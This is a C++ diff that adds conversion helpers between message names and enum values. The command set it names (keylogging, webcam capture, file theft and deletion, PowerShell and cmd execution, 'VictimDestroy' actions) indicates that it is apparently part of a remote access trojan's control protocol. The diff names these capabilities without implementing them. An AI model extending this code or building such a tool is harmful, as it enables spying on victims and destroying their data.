@@ -74,6 +74,54 @@ int Message::setSegmentSize() {
     return segmentSize = 16 + jsonDataSize + binaryDataSize;
 }
 
+std::string messageEnumToString(MessageEnum num) {
+    std::string tstr = "";
+    switch(num) {
+        case MessageRawText:    tstr = "MessageRawText"; break; 
+        case MessageScreenCap:    tstr = "MessageScreenCap"; break; 
+        case MessageEnableKeylog:    tstr = "MessageEnableKeylog"; break; 
+        case MessageDisableKeylog:    tstr = "MessageDisableKeylog"; break; 
+        case MessageInvokeWebcam:    tstr = "MessageInvokeWebcam"; break; 
+        case MessageListFile:    tstr = "MessageListFile"; break; 
+        case MessageGetFile:    tstr = "MessageGetFile"; break;       
+        case MessageDeleteFile:    tstr = "MessageDeleteFile"; break;       
+        case MessageStartProcess:    tstr = "MessageStartProcess"; break;       
+        case MessageStopProcess:    tstr = "MessageStopProcess"; break;       
+        case MessageListProcess:    tstr = "MessageListProcess"; break;       
+        case MessageShutdownMachine:    tstr = "MessageShutdownMachine"; break;       
+        case MessageRestartMachine:    tstr = "MessageRestartMachine"; break;       
+        case MessageInvokePowershell:    tstr = "MessageInvokePowershell"; break;       
+        case MessageInvokeCmd:    tstr = "MessageInvokeCmd"; break;       
+        case MessageVictimDestroy1:    tstr = "MessageVictimDestroy1"; break;       
+        case MessageVictimDestroy2:    tstr = "MessageVictimDestroy2"; break;       
+        case MessageVictimDestroy3:    tstr = "MessageVictimDestroy3"; break;
+        default: tstr = "Unknown"; break;   
+    }
+    return tstr;
+}
+
+MessageEnum messageStringToEnum(const std::string& tstr) {
+    if(tstr == "MessageRawText") return MessageRawText;
+    else if(tstr == "MessageScreenCap") return MessageScreenCap;
+    else if(tstr == "MessageEnableKeylog") return MessageEnableKeylog;
+    else if(tstr == "MessageDisableKeylog") return MessageDisableKeylog;
+    else if(tstr == "MessageInvokeWebcam") return MessageInvokeWebcam;
+    else if(tstr == "MessageListFile") return MessageListFile;
+    else if(tstr == "MessageGetFile") return MessageGetFile;
+    else if(tstr == "MessageDeleteFile") return MessageDeleteFile;
+    else if(tstr == "MessageStartProcess") return MessageStartProcess;
+    else if(tstr == "MessageStopProcess") return MessageStopProcess;
+    else if(tstr == "MessageListProcess") return MessageListProcess;
+    else if(tstr == "MessageShutdownMachine") return MessageShutdownMachine;
+    else if(tstr == "MessageRestartMachine") return MessageRestartMachine;
+    else if(tstr == "MessageInvokePowershell") return MessageInvokePowershell;
+    else if(tstr == "MessageInvokeCmd") return MessageInvokeCmd;
+    else if(tstr == "MessageVictimDestroy1") return MessageVictimDestroy1;
+    else if(tstr == "MessageVictimDestroy2") return MessageVictimDestroy2;
+    else if(tstr == "MessageVictimDestroy3") return MessageVictimDestroy3;
+    else return MessageUnknown;
+}
+
 int assembleMessage(const char *bindata, int size, Message& msg, std::string *errorString) {
     if (size < 16) {
         if(errorString) *errorString = "Data too smol";
